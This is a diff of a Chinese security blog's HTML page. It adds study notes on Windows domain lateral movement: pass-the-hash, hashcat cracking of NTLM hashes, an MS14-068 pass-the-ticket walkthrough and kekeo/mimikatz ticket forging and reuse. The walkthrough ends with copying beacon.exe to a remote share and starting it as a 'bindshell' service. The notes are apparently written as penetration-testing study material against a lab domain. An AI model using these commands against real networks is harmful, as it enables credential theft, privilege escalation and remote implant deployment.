@@ -191,7 +191,7 @@
     <li><a href="#服务账户攻击">服务账户攻击</a></li>
     <li><a href="#横向移动">横向移动</a>
       <ul>
-        <li><a href="#哈希传递">哈希传递</a></li>
+        <li><a href="#哈希传递攻击pth">哈希传递攻击（PTH）</a></li>
         <li><a href="#ipc横向移动-全称基于ipc认证的smb横向--smb横向的子类">IPC横向移动 （全称：基于IPC认证的SMB横向  。SMB横向的子类）</a></li>
         <li><a href="#wmi横向移动不易被发现">WMI横向移动（不易被发现）</a></li>
         <li><a href="#smb横向易被发现">SMB横向（易被发现）</a></li>
@@ -200,8 +200,11 @@
         <li><a href="#winrm横向">winrm横向</a></li>
         <li><a href="#rdp横向">RDP横向</a></li>
         <li><a href="#利用低速密码枚举手段横向">利用低速密码枚举手段横向</a></li>
+        <li><a href="#读取内存后无法获取明文密码时的解决思路">读取内存后无法获取明文密码时的解决思路：</a></li>
+        <li><a href="#票据传递ptt">票据传递（PTT）</a></li>
       </ul>
     </li>
+    <li><a href="#攻击链梳理">攻击链梳理</a></li>
   </ul>
 </nav>
 </div></div>
@@ -443,23 +446,29 @@
 </span></span></code></pre></div><h2 id="横向移动">
 <a class="header-anchor" href="#%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8"></a>
 横向移动
-</h2><h3 id="哈希传递">
-<a class="header-anchor" href="#%e5%93%88%e5%b8%8c%e4%bc%a0%e9%80%92"></a>
-哈希传递
-</h3><p>为了针对无法直接获取或在内存提取明文密码的情况。</p>
-<p>​	在Windows 7/2008 R2及之前系统，Wdigest默认开启，明文密码常驻内存，拿到SYSTEM权限后可通过<code>sekurlsa::wdigest</code>命令直接提取明文凭据。</p>
-<p>​	Windows 8/2012及之后系统默认关闭了Wdigest明文缓存，可通过修改注册表<code>HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential</code>为1重新开启，用户下次登录后内存中就会留存明文。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">	适用情况：
+</h2><h3 id="哈希传递攻击pth">
+<a class="header-anchor" href="#%e5%93%88%e5%b8%8c%e4%bc%a0%e9%80%92%e6%94%bb%e5%87%bbpth"></a>
+哈希传递攻击（PTH）
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">A.哈希传递攻击的有效场景：
+</span></span><span class="line"><span class="cl">		1.内网机器使用相同密码的情况，如果内网无中重复密码的机器则攻击效果有限。
+</span></span><span class="line"><span class="cl">		2.取得域管理员账户，可任意hash传递。
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">B.为了解决无法直接获取或在内存提取明文密码的情况。
+</span></span><span class="line"><span class="cl">	1.在Windows 7/2008 R2及之前系统，Wdigest默认开启，明文密码常驻内存，拿到SYSTEM权限后可通过`sekurlsa::wdigest`命令直接提取明文凭据。
+</span></span><span class="line"><span class="cl">	2.Windows 8/2012及之后系统默认关闭了Wdigest明文缓存，可通过修改注册表`HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential`为1重新开启，用户下次登录后内存中就会留存明文。
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">C.适用情况：
 </span></span><span class="line"><span class="cl">		1. 采用NTML验证的服务，如 WMI(135)、SMB(445)、RDP(3389)、WINRM(5985)等
-</span></span><span class="line"><span class="cl">		2. 已获取本地管理权限。
-</span></span><span class="line"><span class="cl">		
-</span></span><span class="line"><span class="cl">	工具包括以下（根据不同端口采用不同工具）：
+</span></span><span class="line"><span class="cl">		2. 已获取本地管理员权限，域内普通用户无法进行哈希传递。
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">D.测试工具包括以下（根据不同协议/端口采用不同工具）：
 </span></span><span class="line"><span class="cl">		Evil-WinRM
 </span></span><span class="line"><span class="cl">		CrackMapExec
 </span></span><span class="line"><span class="cl">		Impacket 的 wmiexec
 </span></span><span class="line"><span class="cl">		Impacket 的 mssqlclient
 </span></span><span class="line"><span class="cl">		Impacket 的 psexec
 </span></span><span class="line"><span class="cl">		Passing-The-Hash 工具包中的 pth-winexe
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
 </span></span></code></pre></div><h3 id="ipc横向移动-全称基于ipc认证的smb横向--smb横向的子类">
 <a class="header-anchor" href="#ipc%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8-%e5%85%a8%e7%a7%b0%e5%9f%ba%e4%ba%8eipc%e8%ae%a4%e8%af%81%e7%9a%84smb%e6%a8%aa%e5%90%91--smb%e6%a8%aa%e5%90%91%e7%9a%84%e5%ad%90%e7%b1%bb"></a>
 IPC横向移动 （全称：基于IPC认证的SMB横向  。SMB横向的子类）
@@ -690,7 +699,136 @@ RDP横向
 </span></span><span class="line"><span class="cl">proxychains4 crackmapexec smb 192.168.3.21-32 -u administrator -p pass.txt --local-auth -x &#34;whoami&#34;
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">注意：若是本地账户需添加--local-auth 参数
-</span></span></code></pre></div><hr>
+</span></span></code></pre></div><h3 id="读取内存后无法获取明文密码时的解决思路">
+<a class="header-anchor" href="#%e8%af%bb%e5%8f%96%e5%86%85%e5%ad%98%e5%90%8e%e6%97%a0%e6%b3%95%e8%8e%b7%e5%8f%96%e6%98%8e%e6%96%87%e5%af%86%e7%a0%81%e6%97%b6%e7%9a%84%e8%a7%a3%e5%86%b3%e6%80%9d%e8%b7%af"></a>
+读取内存后无法获取明文密码时的解决思路：
+</h3><ul>
+<li>
+<p>利用（PTH,PTK）等进行移动不需要明文</p>
+</li>
+<li>
+<p>利用其他服务协议进行PTH（SMB/WMI等）</p>
+</li>
+<li>
+<p>利用注册表开启（wdigest auth）进行获取。注：需要系统重启才能生效，易被发现。</p>
+</li>
+<li>
+<p>利用工具或者第三方平台（HASHCAT进行破解获取）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">利用hash进行暴力破解明文
+</span></span><span class="line"><span class="cl">平台：https://www.cmd5.com/
+</span></span><span class="line"><span class="cl">工具：https://hashcat.net/hashcat/
+</span></span><span class="line"><span class="cl">破解
+</span></span><span class="line"><span class="cl">hashcat -a 0 -m 1000 --force 518b98ad4178a53695dc997aa02d455c pass.txt
+</span></span><span class="line"><span class="cl">-m 密文类型
+</span></span><span class="line"><span class="cl">-a 破解类型
+</span></span><span class="line"><span class="cl">?l 小写
+</span></span><span class="line"><span class="cl">?s 符号
+</span></span><span class="line"><span class="cl">?d 数字
+</span></span><span class="line"><span class="cl">字典破解：
+</span></span><span class="line"><span class="cl">hashcat.exe -a 0 -m 1000 hash.txt pass.txt
+</span></span><span class="line"><span class="cl">暴力破解：
+</span></span><span class="line"><span class="cl">hashcat.exe -a 3 -m 1000 518b98ad4178a53695dc997aa02d455c ?l?l?l?l?l?s?s?s?d?d
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="票据传递ptt">
+<a class="header-anchor" href="#%e7%a5%a8%e6%8d%ae%e4%bc%a0%e9%80%92ptt"></a>
+票据传递（PTT）
+</h3><p>​	票据传递使用场景：</p>
+<ul>
+<li>无法获得明文口令，且无法使用hash进行传递攻击（内网内无重复密码的账户）</li>
+<li>PTH可利用的端口或服务未启用或被防火墙拦截。（WMI、SMB、DCOM、RDP、WINRM等）</li>
+<li>有杀软，导致PTH的路径被拦截。</li>
+<li>仅适用域内，非工作组环境。</li>
+</ul>
+<p>​	利用方式：</p>
+<ul>
+<li>通过漏洞</li>
+<li>利用NTLM转换成TGT</li>
+<li>机器历史缓存票据</li>
+<li>加密类型可爆破</li>
+</ul>
+<h4 id="利用ms14-068漏洞进行票据传递">
+<a class="header-anchor" href="#%e5%88%a9%e7%94%a8ms14-068%e6%bc%8f%e6%b4%9e%e8%bf%9b%e8%a1%8c%e7%a5%a8%e6%8d%ae%e4%bc%a0%e9%80%92"></a>
+利用MS14-068漏洞进行票据传递
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">介绍：
+</span></span><span class="line"><span class="cl">	MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证。允许攻击者将域内任意用户权限提升至*域管理级别*。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">影响版本：
+</span></span><span class="line"><span class="cl">	Windows Server 2003
+</span></span><span class="line"><span class="cl">	Windows Server 2008
+</span></span><span class="line"><span class="cl">	Windows Server 2008 R2
+</span></span><span class="line"><span class="cl">	Windows Server 2012 和
+</span></span><span class="line"><span class="cl">	Windows Server 2012 R2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">漏洞产生点：
+</span></span><span class="line"><span class="cl">	在 TGS-REQ 阶段（KDC 准备发放服务票据 ST 时）。
+</span></span><span class="line"><span class="cl">	当 KDC 收到客户端发来的 TGT 后，它的核心任务是验证 TGT 是不是自己发的，并提取里面的用户信息来签发 ST。就在这个过程中，KDC 犯了个致命错误：它没有死守底线去严格核验 TGT 内部镶嵌的 PAC 的签名完整性。攻击者利用恶意构造的数据绕过PAC检测，把伪造的 PAC 成功走私进了 KDC 的信任圈。
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">条件：
+</span></span><span class="line"><span class="cl">	1.域内普通账户的sid值、明文密码(当前exp工具仅支持明文密码)
+</span></span><span class="line"><span class="cl">	2.域控的IP
+</span></span><span class="line"><span class="cl">	3.需要至少具备本机的管理员权限。（涉及票据导入内存）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">实现步骤：
+</span></span><span class="line"><span class="cl">	1.获取SID值：shell whoami/user
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	2.生成票据文件：（这一步涉及域内通信，需要由域内普通账户操作）
+</span></span><span class="line"><span class="cl">		shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">	3.清除票据连接：（删除所有旧的、低权限的票据，防止它们干扰后续操作）
+</span></span><span class="line"><span class="cl">	shell klist purge
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	4.内存导入票据：（这一步需使用管理员账户进行操作）
+</span></span><span class="line"><span class="cl">    mimikatz kerberos::ptc TGT_webadmin@god.org.ccache
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    5.连接目标上线：
+</span></span><span class="line"><span class="cl">    shell dir \\OWA2010CN-GOD\c$
+</span></span><span class="line"><span class="cl">    shell net use \\OWA2010CN-GOD\C$
+</span></span><span class="line"><span class="cl">    copy beacon.exe \\OWA2010CN-GOD\C$
+</span></span><span class="line"><span class="cl">    sc \\OWA2010CN-GOD create bindshell binpath= &#34;c:\beacon.exe&#34;
+</span></span><span class="line"><span class="cl">    sc \\OWA2010CN-GOD start bindshell
+</span></span></code></pre></div><h4 id="利用ntml-hash生成票据">
+<a class="header-anchor" href="#%e5%88%a9%e7%94%a8ntml-hash%e7%94%9f%e6%88%90%e7%a5%a8%e6%8d%ae"></a>
+利用NTML-hash生成票据
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">条件：
+</span></span><span class="line"><span class="cl">	1.需具备NTML-hash。
+</span></span><span class="line"><span class="cl">	2.需具备管理员权限，涉及票据导入
+</span></span><span class="line"><span class="cl">	3.由于涉及票据，用户范围仅限域内用户，本地administrator无法使用此方式。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">步骤：
+</span></span><span class="line"><span class="cl">    生成票据：shell kekeo &#34;tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7&#34; &#34;exit&#34;
+</span></span><span class="line"><span class="cl">    导入票据：shell kekeo &#34;kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&#34; &#34;exit&#34;
+</span></span><span class="line"><span class="cl">    查看票据：shell klist
+</span></span><span class="line"><span class="cl">    利用票据连接：shell dir \\owa2010cn-god\c$
+</span></span></code></pre></div><h4 id="从机器历史缓存提取tgt票据并重新认证">
+<a class="header-anchor" href="#%e4%bb%8e%e6%9c%ba%e5%99%a8%e5%8e%86%e5%8f%b2%e7%bc%93%e5%ad%98%e6%8f%90%e5%8f%96tgt%e7%a5%a8%e6%8d%ae%e5%b9%b6%e9%87%8d%e6%96%b0%e8%ae%a4%e8%af%81"></a>
+从机器历史缓存提取TGT票据，并重新认证
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">为什么会缓存票据：</span>
+</span></span><span class="line"><span class="cl">	<span class="err">域内机器进行认证操作时，会优先采用</span><span class="n">Kerberos认证</span><span class="err">，因此必定会在本机产生</span><span class="n">TGT票据缓存</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="err">条件：</span>
+</span></span><span class="line"><span class="cl">	<span class="mf">1.</span><span class="err">有管理员权限</span>
+</span></span><span class="line"><span class="cl">	<span class="mf">2.</span><span class="err">最近有过其他账户登录本机</span>
+</span></span><span class="line"><span class="cl">	<span class="mf">3.</span><span class="err">票据还在有效期内（默认</span><span class="mi">10</span><span class="err">小时）</span><span class="o">-</span><span class="err">这条很苛刻。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">利用：</span>
+</span></span><span class="line"><span class="cl">    <span class="err">导出票据：</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span> <span class="o">/</span><span class="k">export</span>  <span class="err">（需要管理员权限）</span>
+</span></span><span class="line"><span class="cl">    <span class="err">清楚多余票据：</span><span class="n">shell</span> <span class="n">klist</span> <span class="n">purge</span>   <span class="err">（排除干扰）</span>
+</span></span><span class="line"><span class="cl">    <span class="err">导入票据：（普通域内账户可以实现）</span>
+</span></span><span class="line"><span class="cl">   		<span class="n">mimikatz</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">webadmin</span>\<span class="n">Desktop</span>\<span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">22</span><span class="n">d3a</span><span class="p">]</span><span class="o">-</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mf">40e00000</span><span class="o">-</span><span class="n">Administrator</span><span class="err">@</span><span class="n">krbtgt</span><span class="o">-</span><span class="n">god</span><span class="o">.</span><span class="n">org</span><span class="o">.</span><span class="n">kirbi</span>
+</span></span><span class="line"><span class="cl">    <span class="err">查看票据：</span><span class="n">shell</span> <span class="n">klist</span>
+</span></span><span class="line"><span class="cl">    <span class="err">利用票据连接：</span><span class="n">shell</span> <span class="n">dir</span> \\<span class="n">owa2010cn</span><span class="o">-</span><span class="n">god</span>\<span class="n">c</span><span class="o">$</span>
+</span></span></code></pre></div><h4 id="kerberoasting攻击">
+<a class="header-anchor" href="#kerberoasting%e6%94%bb%e5%87%bb"></a>
+Kerberoasting攻击
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">条件：
+</span></span><span class="line"><span class="cl">	在 &#34;域控机器-本地安全策略-本地策略-安全选项-配置kerberos允许的加密类型&#34; 设置 &#34;RC4_HMAC_MD5&#34; 加密算法。
+</span></span></code></pre></div><h2 id="攻击链梳理">
+<a class="header-anchor" href="#%e6%94%bb%e5%87%bb%e9%93%be%e6%a2%b3%e7%90%86"></a>
+攻击链梳理
+</h2><p>拿到域内普通主机 &mdash;&gt; 信息搜集：域架构、本机敏感文件 &mdash;-&gt; 提权 &mdash;-&gt; 提取ntlm-hash  &mdash;&gt; 利用hash爆破明文，利用CME攻击枚举域内密码是否一致，攻击服务 &mdash;-&gt; 枚举口令成功成功根据协议采用PTH方式 &mdash;-&gt; PTH 所用协议被堵死，利用NTML-hash生成票据 &mdash;&gt;</p>
+<hr>
 <p>Overpass-the-Hash（又称 Pass-the-Key）
 这是一种将窃取的 NTLM 哈希或 AES 密钥转换为 Kerberos 票据，从而在 Kerberos 优先的环境中实现横向移动的攻击技术。其核心是 “升级”凭据，从仅能用于 NTLM 认证的哈希，升级为功能更全的 Kerberos TGT（票证授予票证）</p>
 <hr>
@@ -712,7 +850,7 @@ RDP横向
     aria-label="Article navigation"
     data-aos="fade-up"
   ><div class="article-nav-link-wrap left"><img
-              data-src="https://d-sketon.top/img/_backwebp/bg25.webp"
+              data-src="https://d-sketon.top/img/_backwebp/bg7.webp"
               data-sizes="auto"
               alt="htb-Base"
               class="lazyload"
@@ -724,7 +862,7 @@ RDP横向
         <div class="article-nav-caption">前一篇</div>
         <h3 class="article-nav-title">htb-Base</h3>
       </div><div class="article-nav-link-wrap right"><img
-              data-src="https://d-sketon.top/img/_backwebp/bg9.webp"
+              data-src="https://d-sketon.top/img/_backwebp/bg24.webp"
               data-sizes="auto"
               alt="内网通信"
               class="lazyload"
@@ -756,10 +894,10 @@ RDP横向
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;89.8k</span
+          >&nbsp;91.5k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;03:44</span>
+        <span class="icon-coffee">&nbsp;03:48</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -790,7 +928,7 @@ RDP横向
     <li><a href="#服务账户攻击">服务账户攻击</a></li>
     <li><a href="#横向移动">横向移动</a>
       <ul>
-        <li><a href="#哈希传递">哈希传递</a></li>
+        <li><a href="#哈希传递攻击pth">哈希传递攻击（PTH）</a></li>
         <li><a href="#ipc横向移动-全称基于ipc认证的smb横向--smb横向的子类">IPC横向移动 （全称：基于IPC认证的SMB横向  。SMB横向的子类）</a></li>
         <li><a href="#wmi横向移动不易被发现">WMI横向移动（不易被发现）</a></li>
         <li><a href="#smb横向易被发现">SMB横向（易被发现）</a></li>
@@ -799,8 +937,11 @@ RDP横向
         <li><a href="#winrm横向">winrm横向</a></li>
         <li><a href="#rdp横向">RDP横向</a></li>
         <li><a href="#利用低速密码枚举手段横向">利用低速密码枚举手段横向</a></li>
+        <li><a href="#读取内存后无法获取明文密码时的解决思路">读取内存后无法获取明文密码时的解决思路：</a></li>
+        <li><a href="#票据传递ptt">票据传递（PTT）</a></li>
       </ul>
     </li>
+    <li><a href="#攻击链梳理">攻击链梳理</a></li>
   </ul>
 </nav>
 </div></div>
